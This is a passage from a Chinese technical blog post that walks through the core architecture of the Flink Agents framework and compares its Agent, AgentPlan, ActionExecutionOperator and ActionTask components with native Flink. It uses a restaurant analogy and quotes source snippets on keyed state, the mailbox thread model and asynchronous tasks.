pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【大数据 &amp; AI】Flink Agents 源码解读 --- (2) --- 核心架构</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 摘要</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 Flink Agents主要组件</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 主要组件</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 内部成员变量映射关系</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 执行流程</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 与原生Flink比对</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 核心</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 具体比对</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 实例拆解</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 第一层级：Agent – 餐厅菜单和规则手册（Blueprint）</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 第二层级：AgentPlan – 餐厅的详细操作流程图（Compiled Plan,计划编译层）</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.3 第三层级：ActionExecutionOperator – 餐厅的执行管理层（Runtime Executor，执行引擎层）</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.4 第四层级：ActionTask – 具体的服务步骤（Execution Unit）</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.5 工作流程举例</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x04 并发性和并行性</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.1 Flink原生并发模型</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.2 每个Key的状态管理</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.3 邮箱线程模型</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.4 异步任务处理</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.5 内存一致性</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.6 水印和事件时间处理</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.7 检查点和恢复</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">4.8 总结</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF 参考</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 摘要</h3>
<p>Flink Agents 框架的核心是 <strong>“事件驱动 + 状态隔离 + 多语言协作”</strong> ：通过 Agent/AgentPlan 实现业务逻辑的声明式定义，借助 Flink 原生的分布式、高并发能力实现可靠执行，同时支持 Python 生态的工具 / 模型集成，兼顾了开发灵活性与运行时效率，适用于复杂 AI 代理任务的分布式部署与执行。</p>
<p>具体而言，Flink Agents 的组件是对原生 Flink 组件在 “Agent 业务场景” 下的语义化封装，而非全新发明。因此，本文将先介绍Flink Agents的基本组件，然后将其组件与Flink 原生组件做对比，最后给出一个详细的例子，这样读者可以更好的理解其设计精要。</p>
<h3 data-id="heading-2">0x01 Flink Agents主要组件</h3>
<p>可以把 Flink Agents 的整个执行流程比作 “做一道菜”，我们借此进行分析。</p>
<h4 data-id="heading-3">1.1 主要组件</h4>
<p>Flink Agents 是基于原生 Flink 分布式流处理能力封装的上层框架。其中四个主要组件代表了 Flink Agents 框架中的四个层次：</p>
<ul>
<li><strong>Agent（顶层设计，定义了“做什么”）</strong> ：用户定义的智能实体，类似 “餐厅菜单 + 规则手册”，包含业务逻辑、动作（Action）和资源（工具、模型等）定义，明确 “做什么”。</li>
<li><strong>AgentPlan（中间编译层，确定了“怎么做”）</strong> ：将 Agent 编译后的可执行计划，类似 “详细操作流程图”，明确动作触发规则、资源映射关系，确定 “怎么做”。</li>
<li><strong>ActionExecutionOperator（运行时执行层，是执行环境，负责“协调调度”）</strong> ：Flink 集群中的执行核心，在 Flink 流处理环境中实际执行操作，类似 “餐厅首席大厨”，负责接收数据、调度任务、管理状态，协调整体执行流程。</li>
<li><strong>ActionTask（最小执行单元，负责“具体实施”）</strong> ：具体的执行任务，类似 “员工的单个服务步骤”，分为 JavaActionTask 和 PythonActionTask，处理单个事件并返回结果。</li>
</ul>
<p>具体可以参见下图。</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">Agent</span>] 菜单手册
    ↓（编译）
[<span class="hljs-meta">AgentPlan</span>] 详细流程图
    ↓（运行时实例化）
[<span class="hljs-meta">ActionExecutionOperator</span>] 餐厅首席大厨
    ↓（分配任务）
[<span class="hljs-meta">ActionTask</span>] 员工具体任务
</code></pre>
<p>这样的设计使得系统既灵活又高效，能够处理复杂的AI代理任务，同时保证了良好的扩展性和维护性。</p>
<h4 data-id="heading-4">1.2 内部成员变量映射关系</h4>
<p>Agent、AgentPlan 和 ActionExecutionOperator 之间的关系以及它们内部成员变量的映射关系如下。</p>
<h5 data-id="heading-5">1.2.1 Agent 到 AgentPlan</h5>
<p>Agent 到 AgentPlan 的映射如下：</p>

























<table><thead><tr><th>Agent 成员</th><th>AgentPlan 对应成员</th><th>说明</th></tr></thead><tbody><tr><td>_actions（装饰器定义）</td><td>actions, actions_by_event</td><td>Agent 中通过 @action 装饰器定义的动作被编译到 AgentPlan 的动作映射中</td></tr><tr><td>_actions（add_action 添加）</td><td>actions, actions_by_event</td><td>通过 add_action 方法添加的动作同样编译到动作映射中</td></tr><tr><td>_resources</td><td>resource_providers</td><td>Agent 中注册的资源被转换为资源提供者</td></tr></tbody></table>
<h5 data-id="heading-6">1.2.2 AgentPlan 到 ActionExecutionOperator</h5>
<p>AgentPlan 到 ActionExecutionOperator 的映射如下：</p>

























<table><thead><tr><th>AgentPlan 成员</th><th>ActionExecutionOperator 对应成员</th><th>说明</th></tr></thead><tbody><tr><td>actions</td><td>通过 getActionsTriggeredBy() 方法调用</td><td>Operator 根据事件类型查找对应的动作</td></tr><tr><td>resource_providers</td><td>在 RunnerContextImpl 中使用</td><td>提供运行时所需的资源</td></tr><tr><td>config</td><td>metricGroup, builtInMetrics 等</td><td>用于配置指标和其他运行时行为</td></tr></tbody></table>
<h6 data-id="heading-7">详细映射分析</h6>
<h6 data-id="heading-8">动作执行映射</h6>
<p>在 <code>ActionExecutionOperator</code> 中：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 根据事件类型获取触发的动作</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> List&lt;Action&gt; <span class="hljs-title">getActionsTriggeredBy</span>(<span class="hljs-params">Event <span class="hljs-keyword">event</span></span>)</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">event</span> instanceof PythonEvent) {
        <span class="hljs-keyword">return</span> agentPlan.getActionsTriggeredBy(((PythonEvent) <span class="hljs-keyword">event</span>).getEventType());
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> agentPlan.getActionsTriggeredBy(<span class="hljs-keyword">event</span>.getClass().getName());
    }
}

<span class="hljs-comment">// 创建 ActionTask 来执行动作</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> ActionTask <span class="hljs-title">createActionTask</span>(<span class="hljs-params">Object key, Action action, Event <span class="hljs-keyword">event</span></span>)</span> {
    <span class="hljs-keyword">if</span> (action.getExec() instanceof JavaFunction) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> JavaActionTask(
            key, <span class="hljs-keyword">event</span>, action, getRuntimeContext().getUserCodeClassLoader());
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (action.getExec() instanceof PythonFunction) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> PythonActionTask(key, <span class="hljs-keyword">event</span>, action);
    }
    <span class="hljs-comment">// ..</span>
}
</code></pre>
<h6 data-id="heading-9">资源管理映射</h6>
<p><code>AgentPlan</code> 中的资源提供者在 <code>ActionExecutionOperator</code> 中通过 <code>RunnerContextImpl</code> 访问：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 RunnerContextImpl 中</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">Resource</span> <span class="hljs-title function_">getResource</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name, ResourceType <span class="hljs-keyword">type</span></span>) {
    <span class="hljs-keyword">return</span> agentPlan.<span class="hljs-title function_">getResource</span>(name, <span class="hljs-keyword">type</span>);
}
</code></pre>
<h6 data-id="heading-10">配置映射</h6>
<p>AgentPlan 中的配置信息被用于初始化ActionExecutionOperator的各种运行时组件：</p>
<pre><code class="hljs language-ini" lang="ini">// 在 ActionExecutionOperator.open() 中
<span class="hljs-attr">metricGroup</span> = new FlinkAgentsMetricGroupImpl(getMetricGroup())<span class="hljs-comment">;</span>
<span class="hljs-attr">builtInMetrics</span> = new BuiltInMetrics(metricGroup, agentPlan)<span class="hljs-comment">;</span>

// ActionStateStore 初始化也依赖于配置
if (<span class="hljs-attr">actionStateStore</span> == null &amp;&amp; KAFKA.getType().equalsIgnoreCase(agentPlan.getConfig().get(ACTION_STATE_STORE_BACKEND))) {
    <span class="hljs-attr">actionStateStore</span> = new KafkaActionStateStore(agentPlan.getConfig())<span class="hljs-comment">;</span>
}
</code></pre>
<h6 data-id="heading-11">状态管理映射</h6>
<p>ActionExecutionOperator 中的各种状态与 AgentPlan 的执行需求相对应：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 短期内存状态用于动作间的数据共享</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> MapState&lt;String, MemoryObjectImpl.MemoryItem&gt; shortTermMemState;

<span class="hljs-comment">// 动作任务状态用于异步执行管理</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> ListState&lt;ActionTask&gt; actionTasksState;

<span class="hljs-comment">// 待处理事件状态用于流控</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> ListState&lt;Event&gt; pendingInputEventsState;
</code></pre>
<h4 data-id="heading-12">1.3 执行流程</h4>
<p>具体流程如下：</p>
<pre><code class="hljs language-css" lang="css">Action <span class="hljs-selector-tag">Code</span> → Agent → AgentPlan → ActionExecutionOperator → ActionTask → Flink Runtime
</code></pre>
<p>以 ReActAgent 为例，其流程如下：</p>
<ul>
<li>
<p>用户定义 ReActAgent，包含 <code>start_action</code> 和 <code>stop_action</code></p>
</li>
<li>
<p>通过 <code>AgentPlan.from_agent()</code> 编译成计划：</p>
<ul>
<li><code>actions</code>：包含 <code>start_action</code> 和 <code>stop_action</code></li>
<li><code>actions_by_event</code>：映射 <code>InputEvent</code> → <code>start_action</code>，<code>ChatResponseEvent</code> → <code>stop_action</code></li>
</ul>
</li>
<li>
<p>在运行环境中，AgentPlan 被传递给 ActionExecutionOperatorFactory。ActionExecutionOperatorFactory 创建 ActionExecutionOperator 实例。</p>
</li>
<li>
<p>ActionExecutionOperator 在运行时根据 AgentPlan 执行具体操作。在 ActionExecutionOperator 中：</p>
<ul>
<li>接收到 InputEvent 后，查找并执行 start_action</li>
<li>start_action 发送 ChatRequestEvent</li>
<li>查找并执行处理 ChatRequestEvent 的内置动作（如 CHAT_MODEL_ACTION）</li>
<li>PythonActionTask 执行工具函数，若为生成器则创建 PythonGeneratorActionTask 持续执行；</li>
<li>工具执行完成生成 ChatResponseEvent</li>
<li>查找并执行 stop_action</li>
<li>stop_action 产生 OutputEvent 并发送到下游</li>
</ul>
</li>
</ul>
<p>这种设计实现了关注点分离：用户只需关注业务逻辑定义，框架负责将其编译为高效的运行时执行计划。</p>
<h3 data-id="heading-13">0x02 与原生Flink比对</h3>
<p>Flink Agents 是原生 Flink 的 “领域封装”：所有组件都能映射到原生 Flink 核心组件，未脱离 Flink 流处理的核心架构。我们接下来看看 Flink Agents 里的 Agent、AgentPlan、ActionExecutionOperator、ActionTask 这些核心组件，分别对应原生 Flink 中的哪些核心组件，以及它们的相似性逻辑。</p>
<h4 data-id="heading-14">2.1 核心</h4>
<p>我们先用一张表来概括比对关系。</p>






























<table><thead><tr><th>Flink Agents 组件</th><th>原生 Flink 对应组件</th><th>核心角色</th></tr></thead><tbody><tr><td>Agent</td><td>StreamGraph / 用户 DataStream 代码</td><td>高层业务逻辑声明（做什么）</td></tr><tr><td>AgentPlan</td><td>JobGraph</td><td>编译后的可执行计划（怎么拆）</td></tr><tr><td>ActionExecutionOperator</td><td>KeyedProcessOperator/StreamOperator</td><td>运行时核心执行算子（核心载体）</td></tr><tr><td>ActionTask</td><td>算子内处理单元 / AsyncFunction 任务</td><td>原子执行任务（最小执行单元）</td></tr></tbody></table>
<p>核心映射逻辑如下：「声明层（Agent）→ 编译层（AgentPlan）→ 执行算子（ActionExecutionOperator）→ 原子任务（ActionTask）」对应原生 Flink 的「StreamGraph → JobGraph → StreamOperator → 算子内处理单元」；</p>
<p>回到 “做一道菜” ，我们进行分拆对比。</p>
<ul>
<li>Agent = 你写的 “菜谱逻辑”（比如 “做番茄炒蛋，先炒蛋再炒番茄”）→ 对应 Flink StreamGraph（纯逻辑）；</li>
<li>AgentPlan = 餐厅后厨把菜谱转换成的 “可执行工单”（明确 “谁来炒、用哪个锅、放多少盐”）→ 对应 Flink JobGraph（可执行计划）；</li>
<li>ActionExecutionOperator = 掌勺厨师（执行工单）→ 对应 Flink StreamOperator；</li>
<li>ActionTask = 厨师的 “单个翻炒动作”→ 对应 Flink 算子内的原子处理任务；</li>
<li>Flink ExecutionGraph = 厨师实际站在哪个灶台、用哪套厨具 → 物理执行层，和 AgentPlan 无关。</li>
</ul>
<h4 data-id="heading-15">2.2 具体比对</h4>
<h5 data-id="heading-16">2.2.1 Agent</h5>
<ul>
<li><strong>相似组件</strong>：Flink Job 的业务逻辑定义（如 DataStream 算子链）、StreamGraph（流式作业的逻辑拓扑）</li>
<li><strong>相似性核心</strong>：Agent 是用户定义的 “智能实体”（包含业务逻辑、动作、资源），本质是业务层面的 “作业逻辑声明”；这和原生 Flink 中用户编写的 DataStream 代码（定义 “数据怎么处理”）、StreamGraph（描述逻辑拓扑）的角色完全一致 —— 都是 “告诉系统要做什么” 的顶层逻辑定义，不涉及具体执行。</li>
<li><strong>差异</strong>：Agent 更聚焦 “Agent 行为 / 工具调用” 的语义，而原生 StreamGraph 是通用的数据流拓扑。</li>
</ul>
<h5 data-id="heading-17">2.2.2 AgentPlan</h5>
<ul>
<li><strong>相似组件</strong>：Flink 的 JobGraph（StreamGraph 编译后的可执行拓扑）</li>
<li><strong>相似性核心</strong>：AgentPlan 是 Agent 编译后的 “可执行计划”（明确动作触发规则、资源映射），本质是将高层业务逻辑转换为系统可识别的执行计划；这和原生 Flink 中 StreamGraph 编译为 JobGraph 的过程一致 ——JobGraph 把用户的逻辑拓扑转换为包含并行度、算子链、中间结果传递的可执行拓扑，AgentPlan 则把 Agent 的 “行为规则” 转换为系统可调度的 “动作执行规则”。</li>
<li><strong>关键共性</strong>：都是 “编译层” 产物，连接高层定义与底层执行。</li>
</ul>
<h5 data-id="heading-18">2.2.3 ActionExecutionOperator</h5>
<ul>
<li>
<p><strong>相似组件</strong>：Flink 核心的 StreamOperator（如 ProcessOperator、FlatMapOperator）、KeyedProcessOperator</p>
</li>
<li>
<p><strong>相似性核心</strong>：ActionExecutionOperator 是 Flink 集群中执行 Agent 逻辑的核心算子，本质是运行时的核心执行单元；这和原生 Flink 的 StreamOperator 完全对应 ——StreamOperator 是处理数据流的核心载体（如 ProcessOperator 处理 KeyedStream、实现状态管理），ActionExecutionOperator 就是针对 “Agent 动作执行” 场景定制的 StreamOperator：</p>
<ul>
<li>都运行在 TaskManager 中，处理流数据（Event）；</li>
<li>都支持键控状态（Keyed State），按 key 隔离执行上下文；</li>
<li>都依赖 Mailbox 机制调度任务，避免阻塞；</li>
<li>都负责状态管理、事件处理、结果输出。</li>
</ul>
</li>
<li>
<p><strong>典型对应</strong>：ActionExecutionOperator 最接近原生的 <code>KeyedProcessOperator</code>（键控处理、状态管理、异步任务调度）。</p>
</li>
</ul>
<h5 data-id="heading-19">2.2.3 ActionTask</h5>
<ul>
<li>
<p><strong>相似组件</strong>：Flink 的「算子内的处理任务」（如 ProcessFunction 中的单个元素处理逻辑）、Async I/O 中的 <code>AsyncFunction</code> 任务</p>
</li>
<li>
<p><strong>相似性核心</strong>：ActionTask 是 “最小执行单元”（如单个 Python/Java 动作执行），本质是算子内的原子处理任务；这和原生 Flink 中：</p>
<ul>
<li>ProcessOperator 处理单个 StreamElement（如一条数据）的逻辑单元；</li>
<li>Async I/O 中 AsyncFunction 封装的异步任务（如异步查询数据库）；</li>
</ul>
<p>角色完全一致 —— 都是 “算子内的最小可执行任务”，执行完成后返回结果，支持异步 / 分阶段执行。</p>
</li>
<li>
<p><strong>关键共性</strong>：</p>
<ul>
<li>都是 “原子执行单元”，不可再拆分；</li>
<li>支持异步执行（如 PythonActionTask 对应 Async I/O）；</li>
<li>执行结果可触发后续任务（如 ActionTaskResult 生成新任务，对应 Async I/O 回调触发后续处理）。</li>
</ul>
</li>
<li>
<p><strong>细分对应</strong>：</p>
<ul>
<li>JavaActionTask → 原生同步处理任务（如 ProcessFunction 中的同步逻辑）；</li>
<li>PythonActionTask → 原生 Async I/O 任务（异步调用外部服务 / 脚本）。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-20">0x03 实例拆解</h3>
<p>我们来进一步解释 Flink Agents 这几个核心概念的关系和配合。为了更好的说明，我们可以把整个Flink Agents系统从”做一道菜“拓展到”一个智能餐厅自动化服务系统“。同时，结合实例也深入下技术细节。</p>
<h4 data-id="heading-21">3.1 第一层级：Agent – 餐厅菜单和规则手册（Blueprint）</h4>
<p>Flink Agents 中的 Agent 是用户定义的智能实体，负责协调各种资源和行为来完成特定的任务。我们把 Agent 想象成餐厅的菜单和运营手册：</p>
<ul>
<li>
<p>定义了餐厅能提供哪些菜品和服务（动作）</p>
</li>
<li>
<p>规定了需要用到哪些设备和食材（资源），如同为新员工配备工具箱，对应程序员实际用到的，可以是：</p>
<ul>
<li>各种 API 接口（相当于工具）</li>
<li>数据库访问权限（相当于参考资料）</li>
<li>决策逻辑代码（相当于培训材料）</li>
</ul>
</li>
<li>
<p>遇到什么情况应该做什么（对应事件监听）</p>
</li>
<li>
<p>描述了顾客点餐到上菜的完整流程</p>
<ul>
<li>有一个 start_action（接待员）负责接收顾客问题</li>
<li>有一个 stop_action（收银员）负责最终结账输出结果</li>
</ul>
</li>
</ul>
<p>这些都被封装在 Agent 对象中。</p>
<h4 data-id="heading-22">3.2 第二层级：AgentPlan – 餐厅的详细操作流程图（Compiled Plan,计划编译层）</h4>
<p>Flink Agent框架会把用户的 Agent 转换为一个更通用、更适合系统处理的形式 —— AgentPlan。在本例中，AgentPlan 相当于将餐厅运营手册编译成的详细工作流程图（抽象化的工作蓝图）：</p>
<ul>
<li>把菜单上的每道菜分解成具体的步骤</li>
<li>明确每个岗位（动作）在什么情况下被触发，即遇到啥事件（Event）该干啥活（Action）</li>
<li>准备好所有需要的工具和材料清单（Resource）</li>
</ul>
<p>就像餐厅经理会制定详细的操作手册，告诉服务员什么时候该做什么事。</p>
<h5 data-id="heading-23">结构化解析</h5>
<p>AgentPlan 包含几个关键部分：</p>
<p><strong>Actions 映射表</strong></p>
<ul>
<li>明确列出所有可以执行的动作及其触发条件</li>
<li>例如：“收到订单查询请求” → “执行订单查询动作”</li>
</ul>
<p><strong>资源提供者目录</strong></p>
<ul>
<li>记录所有可用资源的位置和获取方式</li>
<li>类似于工厂里各个供应部门的联系方式清单</li>
</ul>
<p><strong>配置参数集</strong></p>
<ul>
<li>存储运行所需的各项设置选项</li>
<li>像是设备操作规程和技术规范</li>
</ul>
<h5 data-id="heading-24">平台适配性</h5>
<p>通过这种抽象化，无论底层是 Java 还是 Python 实现，都可以统一用同一份 AgentPlan 来进行调度管理。</p>
<h4 data-id="heading-25">3.3 第三层级：ActionExecutionOperator – 餐厅的执行管理层（Runtime Executor，执行引擎层）</h4>
<p>在大规模生产环境中，不能只靠一个管家干活，而是需要一条自动化流水线。ActionExecutionOperator 就像是一条智能化的工厂装配线，它按照操作手册（AgentPlan）组织多个工作站来协同完成任务。或者说，ActionExecutionOperator 是餐厅的现场执行管理层，是整个系统的“大脑 + 中枢控制室”：</p>
<ul>
<li>负责接待进店的顾客（接收数据）</li>
<li>根据流程图分配任务给不同的员工（执行动作）</li>
<li>协调各个岗位之间的工作（监控进度状态 / 管理状态和内存）</li>
<li>确保服务流程顺畅（处理并发和容错）</li>
<li>餐厅经理拿着详细流程图，指挥各个员工协同工作。</li>
</ul>
<h4 data-id="heading-26">3.4 第四层级：ActionTask – 具体的服务步骤（Execution Unit）</h4>
<p>ActionTask 就像是员工执行的具体服务步骤，是生产线上的最小工位：一次只干一件具体活（调用 Python 函数、查数据库、发 HTTP、写 Kafka …）：</p>
<ul>
<li>每个服务员接到的任务就是一个 ActionTask</li>
<li>可能是简单一步完成（普通服务员）</li>
<li>可能是需要多步完成（需要回访的技术员），即如果活太多（异步、长耗时），服务员会把自己「切分」成新任务，等下次轮询再接着干，实现非阻塞的协作式调度。</li>
<li>完成后报告结果，并可能触发下一步工作，即干完就能立即把结果（Event）扔回传送带，继续下一轮</li>
</ul>
<h4 data-id="heading-27">3.5 工作流程举例</h4>
<p>假设顾客来到餐厅点了一份复杂的套餐：</p>
<ul>
<li>
<p>顾客进店（InputEvent）</p>
<ul>
<li>餐厅经理（ActionExecutionOperator）接待顾客</li>
<li>根据流程图知道应该让接待员（start_action）处理</li>
</ul>
</li>
<li>
<p>接待员处理（ActionTask）</p>
<ul>
<li>接待员（PythonActionTask）接到任务</li>
<li>理解顾客需求，生成厨房订单（ChatRequestEvent）</li>
</ul>
</li>
<li>
<p>厨房制作（内置动作）</p>
<ul>
<li>厨师（CHAT_MODEL_ACTION）收到订单开始制作</li>
<li>制作完成后通知服务员（ChatResponseEvent）</li>
</ul>
</li>
<li>
<p>收银结账（ActionTask）</p>
<ul>
<li>收银员（stop_action）处理最终结果</li>
<li>顾客打包带走（OutputEvent）</li>
</ul>
</li>
</ul>
<p>「用户只管把管家训好，框架负责把管家变成手册，再把手册变成并行生产线，最后让无数worker按 key 隔离、事件驱动、可检查点的方式跑在 Flink 上。」。</p>
<h3 data-id="heading-28">0x04 并发性和并行性</h3>
<p>Flink Agents 系统在设计时已经充分考虑了并发性和并行性，比如：</p>
<ul>
<li><strong>事件驱动模型</strong>：基于事件流转触发动作，初始为 InputEvent，经多轮事件（如 ChatRequestEvent、ChatResponseEvent）触发，最终输出 OutputEvent。</li>
<li><strong>并发与隔离设计</strong>：利用 Flink 键控流（KeyedStream）实现按 key 分区，每个 key 拥有独立状态；通过邮箱线程模型（MailboxExecutor）实现协作式多任务，避免阻塞。</li>
<li><strong>任务切分机制</strong>：长时间运行的任务（如 Python 生成器）会被切分为多个 ActionTask，执行后通过 ActionTaskResult 传递下一个任务，确保并发效率。</li>
<li><strong>本地与远程执行</strong>：本地用 LocalRunner 模拟执行，远程基于 Flink 集群的 ActionExecutionOperator 分布式执行，保持 API 一致性。</li>
</ul>
<p>以下是具体实现方式：</p>
<h4 data-id="heading-29">4.1 Flink原生并发模型</h4>
<p>系统充分利用了Apache Flink的原生并发机制：</p>
<ul>
<li>键控流（Keyed Streams）：使用Flink的KeyedStream按key对数据进行分区，确保相同key的事件由同一个并行实例处理</li>
<li>并行操作符：ActionExecutionOperator可以在Flink集群中的多个实例上并行运行</li>
</ul>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 在CompileUtils.java中 - 将代理连接到键控流</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-operator">&lt;</span><span class="hljs-type">IN</span>, <span class="hljs-type">K</span><span class="hljs-operator">&gt;</span> <span class="hljs-type">DataStream</span>&lt;<span class="hljs-type">Object</span>&gt; connectToAgent(
    <span class="hljs-type">DataStream</span>&lt;<span class="hljs-type">IN</span>&gt; inputStream, <span class="hljs-type">KeySelector</span>&lt;<span class="hljs-type">IN</span>, <span class="hljs-type">K</span>&gt; keySelector, <span class="hljs-type">AgentPlan</span> agentPlan) {
    <span class="hljs-keyword">return</span> connectToAgent(inputStream.keyBy(keySelector), agentPlan);
}
</code></pre>
<p>在 RemoteExecutionEnvironment 中有：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">DataStream</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">toDataStream</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (agentPlan == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Must apply agent before calling toDataStream"</span>);
    }

    <span class="hljs-keyword">if</span> (outputDataStream == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (keySelector != <span class="hljs-literal">null</span>) {
            outputDataStream =
                    <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream, keySelector, agentPlan);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// If no key selector provided, use a simple pass-through key selector</span>
            outputDataStream =
                    <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream, x -&gt; x, agentPlan);
        }
    }

    <span class="hljs-keyword">return</span> outputDataStream;
}
</code></pre>
<h4 data-id="heading-30">4.2 每个Key的状态管理</h4>
<p>每个key都维护独立的状态隔离：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 在ActionExecutionOperator.java中 - 维护每个key的状态</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> ListState&lt;ActionTask&gt; actionTasksKState;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> ListState&lt;Event&gt; pendingInputEventsKState;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> ValueState&lt;Long&gt; sequenceNumberKState;
</code></pre>
<p>这些都是键控状态（keyed state），意味着每个key都有自己的独立状态实例，防止不同key之间的竞争条件。</p>
<h4 data-id="heading-31">4.3 邮箱线程模型</h4>
<p>系统使用Flink的邮箱线程模型实现协作式多任务处理：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 在ActionExecutionOperator.java中</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">transient</span> MailboxExecutor mailboxExecutor;

<span class="hljs-comment">// 提交任务进行处理</span>
mailboxExecutor.submit(() -&gt; tryProcessActionTaskForKey(key), <span class="hljs-string">"process action task"</span>);
</code></pre>
<p>这允许长时间运行的操作让出控制权，防止阻塞整个操作符。</p>
<h4 data-id="heading-32">4.4 异步任务处理</h4>
<p>支持异步执行并具备适当的状态管理：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 在 ActionTask.java 中 - 支持基于延续的执行</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActionTaskResult</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> boolean finished;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">List</span>&lt;<span class="hljs-type">Event</span>&gt; outputEvents;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Optional</span>&lt;<span class="hljs-type">ActionTask</span>&gt; generatedActionTaskOpt;

    <span class="hljs-comment">// 允许一个动作生成延续任务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">Optional</span>&lt;<span class="hljs-type">ActionTask</span>&gt; getGeneratedActionTask() {
        <span class="hljs-keyword">return</span> generatedActionTaskOpt;
    }
}
</code></pre>
<h4 data-id="heading-33">4.5 内存一致性</h4>
<p>具有缓存状态访问的线程安全内存管理：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 ActionExecutionOperator.java 中</span>
